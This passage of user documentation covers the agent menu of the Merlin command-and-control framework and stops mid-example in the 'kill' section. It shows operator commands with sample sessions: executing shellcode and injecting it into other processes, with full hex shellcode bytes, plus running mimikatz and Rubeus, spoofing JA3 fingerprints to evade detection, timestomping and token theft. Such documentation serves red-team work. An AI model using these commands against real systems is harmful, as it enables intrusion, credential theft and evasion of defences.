###########
Agent Menu
###########

The agent menu context is used to interact with a single agent. The Merlin prompt will include the word ``agent`` along with the identifier for the selected agent. Type ``help`` to see a list of available commands for the agent menu context.

help
----

.. note::
    The help menu will only show commands available to agent depending on its operating system

* :ref:`help core`
* linux_
* :ref:`help windows`

.. _help core:

core
^^^^

The ``core`` commands are available to every agent regardless of which operating system they are running on

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» help

      COMMAND  |          DESCRIPTION           |            OPTIONS
    +----------+--------------------------------+--------------------------------+
      cd       | Change directories             | cd ../../ OR cd c:\\Users
      clear    | Clear any UNSENT jobs from the |
               | queue                          |
      back     | Return to the main menu        |
      download | Download a file from the agent | download <remote_file>
      env      | View and modify environment    | env <get | set | unset |
               | variables                      | showall> [variable] [value]
      exit     | Instruct the agent to exit and |
               | quit running                   |
      group    | Add or remove the current      | group <add | remove> <group
               | agent to/from a group          | name>
      ifconfig | Displays host network adapter  |
               | information                    |
      interact | Interact with an agent         |
      info     | Display all information about  |
               | the agent                      |
      ja3      | Set the agent's JA3 client     | ja3 <ja3 signature string>
               | signature                      |
      jobs     | Display all active jobs for    |
               | the agent                      |
      kill     | Kill a running process by its  | kill <pid>
               | numerical identifier (pid)     |
      killdate | Set the epoch date/time the    | killdate <epoch date>
               | agent will quit running        |
      ls       | List directory contents        | ls /etc OR ls C:\\Users OR ls
               |                                | C:/Users
      main     | Return to the main menu        |
      maxretry | Set the maximum amount of      | maxretery <number>
               | times the agent can fail to    |
               | check in before it dies        |
      note     | Add a server-side note to the  |
               | agent                          |
      nslookup | DNS query on host or ip        | nslookup 8.8.8.8
      padding  | Set the maximum amount of      | padding <number>
               | random data appended to every  |
               | message                        |
      printenv | Print all environment          | printenv
               | variables. Alias for "env      |
               | showall"                       |
      pwd      | Display the current working    | pwd
               | directory                      |
      quit     | Exit and close the Merlin      | -y
               | server                         |
      rm       | Remove, or delete, a file      | <file path>
      run      | Execute a program directly,    | run ping -c 3 8.8.8.8
               | without using a shell          |
      sessions | Display a table of information |
               | about all checked-in agent     |
               | sessions                       |
      sdelete  | Securely delete a file         | sdelete <file path>
      shell    | Execute a command on the agent | shell ping -c 3 8.8.8.8
               | using the host's default shell |
      skew     | Set the amount of skew, or     | skew <number>
               | jitter, that an agent will use |
               | to checkin                     |
      sleep    | Set the agent's sleep interval | sleep 30s
               | using Go time format           |
      socks    | Start a SOCKS5 listener        | [list, start, stop]
               |                                | <interface:port> <agentID>
      ssh      | Execute command on remote host | ssh <user> <pass> <host:port>
               | over SSH (non-interactive      | <program> [<args>]
      status   | Print the current status of    |
               | the agent                      |
      touch    | Match destination file's       | touch <source> <destination>
               | timestamps with source file    |
               | (alias timestomp)              |
      upload   | Upload a file to the agent     | upload <local_file>
               |                                | <remote_file>
     !         | Execute a command on the host  | !<command> <args>
               | operating system               |

.. _help linux:

linux
^^^^^

These commands are only available to agents running on a ``Linux`` operating system.

.. code-block:: text

           COMMAND      |          DESCRIPTION           |            OPTIONS
    +-------------------+--------------------------------+--------------------------------+
               memfd    | Execute Linux file in memory   | <file path> [<arguments>]

.. _help windows:

windows
^^^^^^^

These commands are only available to agents running on a ``Windows`` operating system.

.. code-block:: text

           COMMAND      |          DESCRIPTION           |            OPTIONS
    +-------------------+--------------------------------+--------------------------------+
      execute-assembly  | Execute a .NET 4.0 assembly    | execute-assembly <assembly
                        |                                | path> [<assembly args>
                        |                                | <spawnto path> <spawnto args>]
      execute-pe        | Execute a Windows PE (EXE)     | execute-pe <pe path> [<pe
                        |                                | args> <spawnto path> <spawnto
                        |                                | args>]
      execute-shellcode | Execute shellcode              | self, remote <pid>,
                        |                                | RtlCreateUserThread <pid>
      invoke-assembly   | Invoke, or execute, a .NET     | <assembly name> <assembly
                        | assembly that was previously   | args>
                        | loaded into the agent's        |
                        | process                        |
      load-assembly     | Load a .NET assembly into the  | <assembly path> [<assembly
                        | agent's process                | name>]
      list-assemblies   | List the .NET assemblies that  |
                        | are loaded into the agent's    |
                        | process                        |
      memory            | Read or write memory for a     | memory <patch,read,write>
                        | provided module and function   | <module> <procedure> [length,
                        |                                | bytes]
      netstat           | display network connections    | netstat [-p tcp|udp]
      pipes             | Enumerate all named pipes      |
      ps                | Get a list of running          |
                        | processes                      |
      runas             | Run a program as another user  | <DOMAIN\USER> <password>
                        |                                | <program> [<args>]
      token             | Interact with Windows access   | <make | privs | rev2self |
                        | tokens                         | steal | whoami >
      sharpgen          | Use SharpGen to compile and    | sharpgen <code> [<spawnto
                        | execute a .NET assembly        | path> <spawnto args>]
      uptime            | Retrieve the host's uptime

.. _cd:

cd
--

The ``cd`` command is used to change the current working directory the Merlin agent is using. Relative paths can be used (e.g.,. ``./../`` or ``downloads\\Merlin``). This command uses native Go and will not execute the ``cd`` binary program found on the host operating system.

| The ``\`` in a Windows directory must be escaped like ``C:\\Windows\\System32``.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd /usr/bin
    [-]Created job evtawDqBWa for agent a98e6175-7799-47fb-abf0-32534a9191f0 at 2019-02-27T01:03:57Z
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job evtawDqBWa at 2019-02-27T01:03:59Z
    Changed working directory to /usr/bin

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd "C:\\Program Files (x86)\\"
    [-]Created job gwFQhcsKJi for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2019-02-27T01:17:26Z
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job gwFQhcsKJi at 2019-02-27T01:17:30Z
    Changed working directory to C:\Program Files (x86)

clear
-----

The ``clear`` command will cancel all jobs in the queue that have not been sent to the agent yet.
This command will only clear jobs for the current agent.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
    [+] jobs cleared for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

back
----

The ``back`` command is used to leave the Agent menu and return back to the :doc:`main`.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» back
    Merlin»

.. _download:

download
--------

The ``download`` command is used to download a file from the host where the agent is running back to the Merlin server. The file will be automatically saved in a folder with a name of the agent's identifier in the `data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786` directory.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Enclose file paths containing a space with quotation marks (e.g.,. ``"C:\\Windows\\Program Files\\"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download C:\\Windows\\hh.exe
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job NXnhJVRUSP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job NXnhJVRUSP
    [+]Successfully downloaded file C:\Windows\hh.exe with a size of 17920 bytes from agent to C:\merlin\data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786\hh.exe
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»

env
---

The ``env`` command is used to interact with environment variables and has the following methods:
  * get_
  * :ref:`env set`
  * showall_
  * unset_

get
^^^

The ``env get`` command is used to retrieve the value of an existing environment variable.
The third, or last, argument is the name of environment variable to retrieve.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env get TEST1
    [-] Created job xaSqAdQBXs for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job xaSqAdQBXs for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Environment variable TEST1=TESTINGTEST

.. _env set:

set
^^^

The ``env set`` command is used create, or overwrite, an environment variable with the specified value.
The third argument is the name of the environment variable and the fourth argument is the environment variables value.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env set TEST1 TESTINGTEST
    [-] Created job NcyukONetb for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job NcyukONetb for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Set environment variable: TEST1=TESTINGTEST

showall
^^^^^^^

The ``env showall`` command enumerates and return all environment variables:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
    [-] Created job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Environment variables:
    SHELL=/bin/bash
    SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/3195,unix/ubuntu:/tmp/.ICE-unix/3195
    QT_ACCESSIBILITY=1
    SNAP_REVISION=148
    XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
    XDG_MENU_PREFIX=gnome-
    GNOME_DESKTOP_SESSION_ID=this-is-deprecated
    SNAP_REAL_HOME=/home/rastley
    GNOME_SHELL_SESSION_MODE=ubuntu
    SSH_AUTH_SOCK=/run/user/1000/keyring/ssh

unset
^^^^^

The ``env unset`` command clears, or empties, the environment variable name provided in the third argument:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env unset TEST1
    [-] Created job hEYjNYeniT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job hEYjNYeniT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Unset environment variable: TEST1

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env get TEST1
    [-] Created job IhKdCrKHEr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job IhKdCrKHEr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    Environment variable TEST1=


exit
----

The ``exit`` control type instructs the agent to exit or die. There is no response on the CLI after the instruction has been provided to the agent. This command is also an alias for agent -> control -> <agent ID> -> exit. This is the shortest way to quickly kill an agent.
 The command will prompt for confirmation to prevent accidentally exiting the agent. If you are certain use the `-y` flag to skip confirmation.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit

    are you sure that you want to exit the agent? [yes/NO]:
    yes
    Merlin»
    [-] Created job LHhrzSYuGS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

.. _execute-assembly:

execute-assembly
-----------------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``execute-assembly`` command uses `go-donut <https://github.com/Binject/go-donut>`_ to convert a .NET assembly into shellcode and then uses the ``windows/x64/go/exec/createProcess`` Merlin module to execute the shellcode.

Currently this command only supports .NET v4.0 assemblies. For more granular control, use the ``windows/x64/go/exec/donut`` module.

The command is executed as: ``execute-assembly <assembly path> [<assembly args> <spawnto path> <spawnto args>]``

The command requires the file path to the assembly you wish to execute in the ``<assembly path>`` argument. All other arguments are optional. The ``<spawnto path>`` argument is the process that will be started on the target and where the shellcode will be injected and executed. If a ``<spawnto path>`` is not provided, ``C:\WIndows\System32\dllhost.exe`` will be used. The ``<spawnto args>`` value is used as an argument when starting the spawnto process.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Use quotes to enclose multiple arguments for ``<assembly args>`` (e.g., ``execute-assembly Seatbelt.exe "LocalGroups LocalUsers"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly Seatbelt.exe "DotNet IdleTime" "C:\\Windows\\System32\\WerFault.exe" /?
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job dmAfzDPUsM for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


    [+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job dmAfzDPUsM



                            %&&@@@&&
                            &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                            &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
    %%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
    #%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
    #%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
    #####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
    #######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
    ###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
    #####%######################  %%%..                       @////(((&%%%%%%%################
                            &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                            &%%&&&%%%%%        v1.1.0         ,(((&%%%%%%%%%%%%%%%%%,
                             #%%%%##,


    ====== DotNet ======

      Installed CLR Versions
          2.0.50727
          4.0.30319

      Installed .NET Versions
          3.5.30729.4926
          4.8.03752

      Anti-Malware Scan Interface (AMSI)
          OS supports AMSI           : True
         .NET version support AMSI   : True
            [!] The highest .NET version is enrolled in AMSI!
            [*] You can invoke .NET version 3.5 to bypass AMSI.
    ====== IdleTime ======

      CurrentUser : DESKTOP-H35RK21\rastley
      Idletime    : 00h:06m:02s:766ms (362766 milliseconds)



    [*] Completed collection in 0.122 seconds

.. _execute-pe:

execute-pe
-----------------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``execute-pe`` command uses `go-donut <https://github.com/Binject/go-donut>`_ to convert a Windows Portable Executable (PE), commonly an .exe, into shellcode and then uses the ``windows/x64/go/exec/createProcess`` Merlin module to execute the shellcode.

The command is executed as: ``execute-pe <pe path> [<pe args> <spawnto path> <spawnto args>]``

The command requires the file path to the PE you wish to execute in the ``<pe path>`` argument. All other arguments are optional. The ``<spawnto path>`` argument is the process that will be started on the target and where the shellcode will be injected and executed. If a ``<spawnto path>`` is not provided, ``C:\WIndows\System32\dllhost.exe`` will be used. The ``<spawnto args>`` value is used as an argument when starting the spawnto process.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Use quotes to enclose multiple arguments for ``<pe args>`` (e.g., ``execute-pe mimikatz.exe "coffee exit"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe mimikatz.exe "coffee exit" C:\\Windows\\System32\\WerFault.exe Testing
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job BSvJZFvbRZ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


    [+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job BSvJZFvbRZ


      .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

    mimikatz(commandline) # coffee

        ( (
         ) )
      .______.
      |      |]
      \      /
       `----'

    mimikatz(commandline) # exit
    Bye!


.. _execute-shellcode:

execute-shellcode
-----------------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``execute-shellcode`` command is used to have the Agent execute the provided shellcode. This command became available in version ``0.6.4`` and is only supported for Windows agents.

The ``execute-shellcode`` command takes the shellcode you want to execute at the last argument. Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following formats:
  * Hex (e.g.,. `5051525356`)
  * ``0x50, 0x51, 0x52, 0x53, 0x56`` with or without spaces and commas
  * ``\x50\x51\x52\x53\x56``
  * Base64 encoded version of the above formats
  * A file containing any of the above formats or just a raw byte file

.. warning::
    Shellcode injection and execution could cause a process to crash so choose wisely

.. note::
    If Cobalt Strike's Beacon is injected using one of these methods, exiting the Beacon will cause the process to die too.

The agent can execute shellcode using one of the following methods:
  * self_
  * remote_
  * RtlCreateUserThread_
  * UserAPC_

.. _self:

self
^^^^

The ``self`` method allocates space within the Merlin Agent process and executes the shellcode.

Syntax is ``execute-shellcode self <SHELLCODE>``

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
    [-]Created job joQNJONrEK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job joQNJONrEK
    [+]Shellcode executed successfully


remote
^^^^^^

The ``remote`` method creates a thread in another process using the `CreateRemoteThreadEx <https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethreadex>`_ Windows API call.

Syntax is ``execute-shellcode remote <PID> <SHELLCODE>`` where PID is the Process ID you want to execute the shellcode under.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote 6560 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
    [-]Created job PRumZQYBFR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job PRumZQYBFR
    [+]Shellcode executed successfully

.. _RtlCreateUserThread:

RtlCreateUserThread
^^^^^^^^^^^^^^^^^^^

The ``rtlcreateuserthread`` method creates a thread in another process using the undocumented `RtlCreateUserThread <http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html>`__ Windows API call.

Syntax is ``execute-shellcode rtlcreateuserthread <PID> <SHELLCODE>`` where PID is the Process ID you want to execute the shellcode under.

Example:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode RtlCreateUserThread 6560 \x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3
    [-]Created job CCWrmdLIFQ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job CCWrmdLIFQ
    [+]Shellcode executed successfully

UserAPC
^^^^^^^

.. _UserAPC:

The ``userapc`` method creates a thread in another process using the `QueueUserAPC <https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc>`__ Windows API call.

Syntax is ``execute-shellcode userapc <PID> <SHELLCODE>`` where PID is the Process ID you want to execute the shellcode under.

.. note::
    This method is highly unstable and therefore was intentionally not added to the tab completion list of available methods. The current implementation requires the process to have more than 1 thread. All remaining threads will have a user-mode APC queued to execute the shellcode and could result in multiple instances of execution. This method frequently causes processes to crash. Additionally, the shellcode might not execute at all if none of the threads were in an alertable state. The ``svchost.exe`` process usually provides a little better choice, but still not guaranteed.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc 4824 /home/rickastley/calc.bin
    [-]Created job NPQGRntaQX for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRntaQX
    [+]Shellcode executed successfully

group
-----

The ``group`` command interacts with server-side groups that agents can be added to and removed from.
Arbitrary agent commands and modules can be executed against an entire group at one time.

* :ref:`agentgroup add`
* :ref:`agentgroup remove`

.. _agentgroup add:

add
^^^

The ``group add`` command adds the current agent to a named group. If the group name does not exist, it will be created.
The list of available agents can be tab completed.

``group add <GroupName>``

.. code-block:: text

    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» group add EvilCorp
    [i] Agent 336154be-9ab9-4add-96e6-69c79f1ce77d added to group EvilCorp
    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» group add Workstations
    [i] Agent 336154be-9ab9-4add-96e6-69c79f1ce77d added to group Workstations
    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» info

      Status                         | Active
      ID                             | 336154be-9ab9-4add-96e6-69c79f1ce77d
                    <SNIP>
      Groups                         | EvilCorp, Workstations
      Note                           |

.. _agentgroup remove:

remove
^^^^^^

The ``group remove`` command is used to remove an agent from a named group. The list of ALL agents is tab completable
but does not mean the agent is in the group. The list of existing groups can also be tab completed.

``group remove <agentID> <GroupName>``

.. code-block:: text

    Merlin» group remove 99dbe632-984c-4c98-8f38-11535cb5d937 EvilCorp
    Merlin»
    [i] Agent 99dbe632-984c-4c98-8f38-11535cb5d937 removed from group EvilCorp

ifconfig
--------

The ``ifconfig`` command will enumerate all of the host's network interfaces and return their configuration.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Ethernet0
      MAC Address   00:0c:29:04:29:9d
      IP Address    192.168.1.132
      Subnet Mask   255.255.255.0
      Gateway       192.168.153.2
      DHCP          Enabled
      DHCP Server:  192.168.1.254

    Bluetooth Network Connection
      MAC Address   f4:02:28:35:ae:b6
      IP Address    0.0.0.0
      Subnet Mask   0.0.0.0
      Gateway       0.0.0.0
      DHCP          Enabled
      DHCP Server:


info
----

The ``info`` command is used to get information about a specific agent to include its configuration and environment.

* Status - The agent's current communication status of either active, delayed, or dead
* ID - The agent's unique identifier that is generated on execution
* Platform - The operating system and architecture the agent is running on
* User Name - The user name the agent is currently running as
* User GUID - The unique identifier for the user the agent is currently running as
* Hostname - The name of the compromised host where the agent is currently running
* Process Name - The name of the process the agent is currently running in
* Process ID - The numerical Process ID (PID) that the agent is currently running in
* IP - A list of interface IP addresses for where the agent is currently running
* Initial Check In - The date and time the agent first connected to the server
* Last Check In - The date and time the agent last connected to the server followed by the relative amount of time in parenthesis
* Groups - Any server-side groups the agent is a member of
* Note - Any operator generated notes about the agent
* Agent Version - The version number of the running agent
* Agent Build - A hash of the git commit the agent was built from
* Agent Wait Time - The amount of time the agent waits, or sleeps, between checkins
* Agent Wait Time Skew - The amount of skew multiplied to the agent wait time
* Agent Message Padding Max - The maximum amount of random data appended to every message to/from the agent
* Agent Max Retries - The maximum amount of times an agent can fail to check in before it quits running
* Agent Failed Check In - The total number of failed check in attempts
* Agent Kill Date - The date the agent will quit running. ``1970-01-01T00:00:00Z`` signifies that the kill date is not set
* Agent Communication Protocol - The protocol the agent is currently communicating over
* Agent JA3 TLS Client Signature - The JA3 client signature. If empty then the default Merlin signature is being used

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info

      Status                         | Active
      ID                             | c1090dbc-f2f7-4d90-a241-86e0c0217786
      Platform                       | linux/amd64
      User Name                      | rastley
      User GUID                      | 1000
      Hostname                       | ubuntu
      Process Name                   | /tmp/go-build799148624/b001/exe/main
      Process ID                     | 200769
      IP                             | 127.0.0.1/8 ::1/128
                                     | 192.168.1.2/24
                                     | fe80::b7bb:3953:682e:cb7f/64
      Initial Check In               | 2021-08-02T23:56:10Z
      Last Check In                  | 2021-08-03T00:18:55Z (0:00:05
                                     | ago)
      Groups                         |
      Note                           |
                                     |
      Agent Version                  | 1.0.2
      Agent Build                    | nonRelease
      Agent Wait Time                | 10s
      Agent Wait Time Skew           | 3000
      Agent Message Padding Max      | 4096
      Agent Max Retries              | 7
      Agent Failed Check In          | 0
      Agent Kill Date                | 1970-01-01T00:00:00Z
      Agent Communication Protocol   | h2
      Agent JA3 TLS Client Signature |

interact
--------

The ``interact`` command takes one argument, the agent ID, and is used to switch agents and interact with a different, specified agent.

.. note::
    Use the built-in tab completion to cycle through and select the agent to interact with.

.. code-block:: text

    Merlin[agent][c22c435f-f7c4-445b-bcd4-0d4e020645af]» interact d07edfda-e119-4be2-a20f-918ab701fa3c
    Merlin[agent][d07edfda-e119-4be2-a20f-918ab701fa3c]»

.. _invoke-assembly:

invoke-assembly
---------------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``invoke-assembly`` command will execute a .NET assembly that was previously loaded into the agent with the
load-assembly_ command. The first argument is the name of the assembly and all the remaining arguments are passed to
the assembly for execution. Use the list-assemblies_ command return a list of loaded assemblies.
The execute-assembly_ command is different because it uses injection to run the assembly in a child process.
This command runs the assembly in the current process without injection.

.. note::
    Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly Rubeus.exe klist
    [-] Created job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.5.0


    Action: List Kerberos Tickets (Current User)

    [*] Current LUID    : 0x37913

.. _ja3:

ja3
---

`JA3 is a method for fingerprinting TLS clients on the wire <https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967>`_. Every TLS client has a unique signature depending on its configuration of the following TLS options: ``SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats``.

The ``ja3`` option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). `This <https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f>`_ article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from https://ja3er.com/

.. note::
    Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The ``-ja3`` flag will override the the ``-proto`` flag and will cause the agent to use the protocol provided in the JA3 hash.

This example will create a TLS client with a JA3 hash of ``51a7ad14509fd614c7bb3a50c4982b8c`` that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job DWXtIAdjYz for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

jobs
----

The ``jobs`` command will display a table of all active jobs assigned to the agent. The output will not include jobs that have already completed.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs

          ID     | STATUS  |     TYPE     |       CREATED        |         SENT
    +------------+---------+--------------+----------------------+----------------------+
      whFGRWHudV | Sent    | NativeCmd    | 2020-12-18T11:45:07Z | 2020-12-18T11:45:38Z
      UxegCkyROR | Sent    | AgentControl | 2020-12-18T11:45:11Z | 2020-12-18T11:45:38Z
      YqhfUvxkqZ | Created | CmdPayload   | 2020-12-18T11:45:44Z |

.. _kill:

kill
----

The ``kill`` command is used to force a running process to quit or exit by its numerical identifier. The Process ID (PID) must be provided.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell "ps aux|grep gnome-calculator"
    [-] Created job mBYVsnbYBS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job mBYVsnbYBS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

